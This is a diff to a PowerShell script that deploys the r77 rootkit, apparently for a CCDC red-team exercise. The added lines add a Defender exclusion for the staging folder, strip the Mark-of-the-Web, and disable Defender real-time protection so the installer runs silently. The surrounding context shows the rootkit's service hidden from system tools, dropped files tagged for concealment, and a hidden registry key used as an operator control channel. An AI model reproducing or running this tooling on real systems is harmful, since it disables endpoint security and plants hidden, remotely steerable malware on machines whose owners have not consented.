@@ -140,9 +140,38 @@ if ($StageUninstaller) {
 }
 
 # ============================================================
-# Layer 2 — Execute r77 installer
+# Layer 2 — Pre-flight: Defender exclusion + file unblock
 # ============================================================
-Write-Section "Layer 2 — Execute r77 Installer"
+Write-Section "Layer 2 — Defender Exclusion + Unblock"
+
+# Add Defender exclusion for staging dir so Install.exe isn't killed on launch
+try {
+    Add-MpPreference -ExclusionPath $StageDir -ErrorAction Stop
+    Write-Success "Defender exclusion added for: $StageDir"
+} catch {
+    Write-Warn "Could not add Defender exclusion (may already be excluded or Defender absent): $_"
+}
+
+# Remove Zone.Identifier Mark-of-the-Web ADS so SmartScreen doesn't block execution
+try {
+    Unblock-File -Path $InstallExe -ErrorAction Stop
+    Write-Success "Unblocked: $InstallExe"
+} catch {
+    Write-Warn "Unblock-File failed (file may already be unblocked): $_"
+}
+
+# Briefly disable real-time protection as a belt-and-suspenders measure
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
+    Write-Success "Defender real-time protection disabled"
+} catch {
+    Write-Warn "Could not disable real-time protection (Tamper Protection may be on): $_"
+}
+
+# ============================================================
+# Layer 3 — Execute r77 installer
+# ============================================================
+Write-Section "Layer 3 — Execute r77 Installer"
 
 Write-Info "Running Install.exe silently..."
 try {
@@ -159,6 +188,7 @@ try {
     }
 } catch {
     Write-Err "Could not launch Install.exe: $_"
+    Write-Warn "If error is 0xfffffffe, Defender killed the process — run Defender_BreakingBad.ps1 first"
     exit 3
 }
 
@@ -166,9 +196,9 @@ try {
 Start-Sleep -Seconds 3
 
 # ============================================================
-# Layer 3 — Verify r77 service is present
+# Layer 4 — Verify r77 service is present
 # ============================================================
-Write-Section "Layer 3 — Verify r77 Service"
+Write-Section "Layer 4 — Verify r77 Service"
 
 # r77 registers a service; the service name starts with the hide prefix and
 # is therefore invisible to sc.exe / Get-Service once injection is active.
@@ -187,10 +217,10 @@ if ($r77SvcKey) {
 }
 
 # ============================================================
-# Layer 4 (optional) — Tag Existing CCDC Artifacts
+# Layer 5 (optional) — Tag Existing CCDC Artifacts
 # ============================================================
 if ($TagExistingArtifacts) {
-    Write-Section "Layer 4 — Tag Existing CCDC Artifacts with $HIDE_PREFIX"
+    Write-Section "Layer 5 — Tag Existing CCDC Artifacts with $HIDE_PREFIX"
 
     # Known CCDC Phase 3 drop locations and file patterns to rename/copy
     $ArtifactPatterns = @(
@@ -225,9 +255,9 @@ if ($TagExistingArtifacts) {
 }
 
 # ============================================================
-# Layer 5 — Drop r77 config registry key (operator communication channel)
+# Layer 6 — Drop r77 config registry key (operator communication channel)
 # ============================================================
-Write-Section "Layer 5 — r77 Config Registry Key"
+Write-Section "Layer 6 — r77 Config Registry Key"
 
 # r77 reads configuration from HKLM:\SOFTWARE\$77config (hidden by the rootkit).
 # Operators can write values here to control behavior at runtime.
